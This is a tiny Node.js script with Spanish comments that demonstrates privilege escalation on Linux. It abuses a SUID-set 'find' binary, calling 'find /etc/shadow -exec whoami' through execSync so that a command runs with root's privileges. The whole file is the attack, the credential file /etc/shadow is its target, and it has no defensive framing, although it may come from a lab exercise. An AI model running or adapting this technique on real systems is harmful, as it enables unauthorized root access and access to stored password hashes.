const { execSync } = require('child_process');
console.log("=== Escalando privilegios con SUID ===");
// Abusamos de find con SUID para ejecutar 'whoami' con los privilegios del dueño del binario (root)
console.log(execSync('find /etc/shadow -exec whoami \\;').toString());
